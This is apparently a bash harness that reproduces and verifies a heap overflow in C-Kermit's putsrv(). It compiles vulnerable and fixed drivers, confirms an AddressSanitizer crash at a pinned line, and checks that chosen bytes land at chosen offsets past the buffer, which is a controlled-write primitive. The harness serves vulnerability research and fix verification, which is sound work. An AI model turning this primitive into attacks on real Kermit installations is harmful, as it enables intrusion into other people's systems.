#!/bin/bash
# C-Kermit putsrv() overflow — verbatim-pin harness.
cd "$(dirname "$0")" || exit 2
set -u
OUT="${1:-out}"
mkdir -p "$OUT"
rm -f "$OUT"/*

pass=0
fail=0
check() {
  if [ "$2" = "$3" ]; then pass=$((pass+1)); echo "PASS $1 ($2)";
  else fail=$((fail+1)); echo "FAIL $1 expected='$3' got='$2'"; fi
}

python3 gen_driver.py > "$OUT/gen.log" 2>&1 || { cat "$OUT/gen.log"; exit 2; }
cat "$OUT/gen.log"

CFLAGS="-O0 -g -std=c99 -Wall"
gcc $CFLAGS -fsanitize=address driver_vuln.c -o "$OUT/vuln_asan" 2>"$OUT/build1.log" || { cat "$OUT/build1.log"; exit 2; }
gcc $CFLAGS -fsanitize=address driver_fixed.c -o "$OUT/fixed_asan" 2>"$OUT/build2.log" || { cat "$OUT/build2.log"; exit 2; }
gcc $CFLAGS driver_vuln.c -o "$OUT/vuln_plain" 2>"$OUT/build3.log" || { cat "$OUT/build3.log"; exit 2; }

export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:symbolize=1

# Rung 1/2/3: tight vulnerable allocation, ASan heap overflow at pinned line.
"$OUT/vuln_asan" tight > "$OUT/tight.raw" 2>&1
trc=$?
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' "$OUT/tight.raw" && a=1 || a=0
check rung3_asan_heap_overflow "$a" 1
grep -q 'WRITE of size 1' "$OUT/tight.raw" && a=1 || a=0
check rung3_write_size_1 "$a" 1
grep -q 'pins/ckcfns.c.vuln:461' "$OUT/tight.raw" && a=1 || a=0
check rung3_pinned_frame "$a" 1
[ "$trc" -ne 0 ] && a=1 || a=0
check rung1_nonzero_exit "$a" 1

# Exactly fitting decode (96 repeats x 94 = 9024 chars) is clean.
"$OUT/vuln_asan" fit > "$OUT/fit.raw" 2>&1
trc=$?
check fit_exit "$trc" 0
grep -q 'emitted=9024 srvcmdlen=9024 oob=0' "$OUT/fit.raw" && a=1 || a=0
check fit_boundary "$a" 1

# One repeat sequence further (9118 decoded chars, 94 over) faults.
"$OUT/vuln_asan" oneover > "$OUT/oneover.raw" 2>&1
trc=$?
[ "$trc" -ne 0 ] && a=1 || a=0
check over_boundary_faults "$a" 1

# Rung 4: chosen bytes at chosen offsets in a 1 MiB collaborator.
"$OUT/vuln_plain" collab_5a > "$OUT/c5a.raw" 2>&1
check collab_5a_exit "$?" 0
grep -E '^offsets: first_oob=5a at_9025=5a count_5a=128 count_41=0' "$OUT/c5a.raw" >/dev/null && a=1 || a=0
check collab_5a_bytes "$a" 1
grep -q 'emitted=9212 srvcmdlen=9024 oob=188' "$OUT/c5a.raw" && a=1 || a=0
check collab_5a_accounting "$a" 1

"$OUT/vuln_plain" collab_41 > "$OUT/c41.raw" 2>&1
check collab_41_exit "$?" 0
grep -E '^offsets: first_oob=41 at_9025=41 count_5a=0 count_41=128' "$OUT/c41.raw" >/dev/null && a=1 || a=0
check collab_41_bytes "$a" 1

"$OUT/vuln_plain" benign > "$OUT/benign.raw" 2>&1
check benign_exit "$?" 0
grep -q 'emitted=9024 srvcmdlen=9024 oob=0' "$OUT/benign.raw" && a=1 || a=0
check benign_zero "$a" 1
grep -E '^offsets: first_oob=00 at_9025=00 count_5a=0 count_41=0 zeros=128' "$OUT/benign.raw" >/dev/null && a=1 || a=0
check benign_zero_control "$a" 1

# Fixed build rejects the first character past srvcmdlen (emitted=9024).
"$OUT/fixed_asan" tight > "$OUT/fixed.raw" 2>&1
check fixed_exit "$?" 0
grep -q 'emitted=9024 srvcmdlen=9024 oob=0 decode_rc=-1 first_reject=9024' "$OUT/fixed.raw" && a=1 || a=0
check fixed_bounded "$a" 1

# Guard page: overflow into PROT_NONE page faults (exit 77 from wrapper below).
"$OUT/vuln_plain" guard > "$OUT/guard.raw" 2>&1
grc=$?
echo "guard_signal_exit=$grc" > "$OUT/guard.exit"
[ "$grc" -ne 0 ] && a=1 || a=0
check guard_page_faults "$a" 1

# Normalized trace: fixed field values only; exclude ASan pid/address/path text.
{
  echo "gen: $(grep 'verbatim_write_line=' "$OUT/gen.log")"
  echo "rung3: $(grep -m1 'ERROR: AddressSanitizer: heap-buffer-overflow' "$OUT/tight.raw")"
  echo "rung3: $(grep -m1 'WRITE of size 1' "$OUT/tight.raw")"
  echo "rung3: $(grep -m1 -o 'pins/ckcfns.c.vuln:[0-9]*' "$OUT/tight.raw" | head -1)"
  grep -h -E '^mode=|^offsets:' "$OUT"/{fit,oneover,c5a,c41,benign,fixed}.raw
  echo "guard_signal_exit=$grc"
} | sed -E 's/(0x[0-9a-f]+)/ADDR/g; s/==[0-9]+==/==PID==/g' > "$OUT/trace.txt"
sha=$(sha256sum "$OUT/trace.txt" | cut -d' ' -f1)
echo "trace_sha256=$sha"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ]
